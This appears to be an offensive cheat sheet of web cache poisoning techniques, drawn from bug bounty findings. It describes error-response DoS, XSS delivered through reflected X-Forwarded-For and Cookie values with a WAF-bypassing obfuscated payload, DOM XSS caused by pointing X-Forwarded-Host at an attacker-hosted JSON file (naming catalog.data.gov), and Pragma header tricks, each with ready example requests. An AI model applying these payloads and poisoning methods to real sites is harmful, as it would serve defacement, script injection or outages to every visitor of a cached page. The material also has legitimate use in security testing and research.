## Web Cache Poisoning DoS

#### X-Forwarded-Port: invalid

**How it works:** Send a single request with a malicious HTTP header (like `X-Forwarded-Port: 123` or `Transfer-Encoding: invalid`) that causes an error response. The cache stores this error and serves it to all subsequent visitors, creating a persistent DoS with just one request.

## Cache Poisoning + XSS

#### File extensions + X-Forwarded-For

**Technique:** Researcher added cacheable file extensions (`.js`, `.css`) to URLs that normally wouldn't cache. Found that both a Cookie value and the `X-Forwarded-For` header were reflected in the response's JavaScript code, allowing XSS injection that bypassed WAF detection.

**WAF bypass trick:** Used 3 separate `X-Forwarded-For` headers to craft the payload across multiple reflections points, closing the `<script>` tag via Cookie while injecting the actual XSS via headers. The obfuscated payload avoided WAF triggers on common XSS patterns.

**Example request:**
```
GET /xyz.js?cache=key HTTP/2 
Host: Redacted
X-Forwarded-For: xss 
X-Forwarded-For: xss><svg/onload=globalThis[`al`+/ert/.source]`1`// X-Forwarded-For: > 
Cookie: gdId=xss</script%20
```

---

#### DOM XSS via X-Forwarded-Host

**Attack chain:** The server trusted the `X-Forwarded-Host` header and used it to populate `data-site-root` attributes in the HTML. JavaScript then fetched a JSON file from that attacker-controlled domain and injected the response directly into the page without sanitization, causing DOM-based XSS that got cached by CloudFront.

**Exploitation:** Attacker poisoned the cache using `X-Forwarded-Host: attacker.com/malicious.json`, which made the victim's browser fetch JSON containing XSS payloads like `"show_more": "Show more <svg onload=alert(document.domain)>"`. The poisoned response was served to all users visiting that URL, effectively defacing catalog.data.gov pages.

**Example request:**
```
GET / HTTP/2
Host: catalog.data.gov'
x-forwarded-host: portswigger-labs.net/catalog.data.gov_json_xss/json.php
```
**Example response:**
```
# site will take the json.php with a malicious XSS and execute it
```

## Cache Poisoning via Pragma Header

#### Pragma: x-get-cache-key
**Technique:** The `Pragma` header, originally an HTTP/1.0 legacy directive for cache control, has a special reconnaissance value in modern cache poisoning. When set to `Pragma: x-get-cache-key`, some cache implementations will reveal the exact cache key components in the response via the `X-Cache-Key` header.

**How it works:** Send a request with `Pragma: x-get-cache-key` to fingerprint which parameters and headers are actually part of the cache key. This reveals what you can manipulate without creating a new cache entry, making it easier to poison existing cached responses.

**Example request:**
```http
GET /api/data HTTP/1.1
Host: target.com
Pragma: x-get-cache-key
```

**Example response:**
```http
HTTP/1.1 200 OK
X-Cache-Key: target.com/api/data
X-Cache-Status: HIT
```

---

#### Pragma: no-cache (Legacy Bypass)

**Technique:** While `Pragma: no-cache` is a legacy HTTP/1.0 header meant to prevent caching, some CDNs and proxies strip it from the cache key while still forwarding it to the origin server. If the origin reflects this header value in the response, it creates a cache poisoning vector.

**How it works:** The cache sees the request without considering `Pragma` in the key, but the origin server processes and reflects it. The poisoned response gets cached and served to all users requesting that URI.

**Example request:**
```http
GET /page?cb=123 HTTP/1.1
Host: target.com
Pragma: <script>alert(1)</script>
```

**Example response:**
```http
HTTP/1.1 200 OK
X-Cache-Status: MISS

<html>
<body>
  <p>Debug: Pragma value = <script>alert(1)</script></p>
</body>
</html>
```
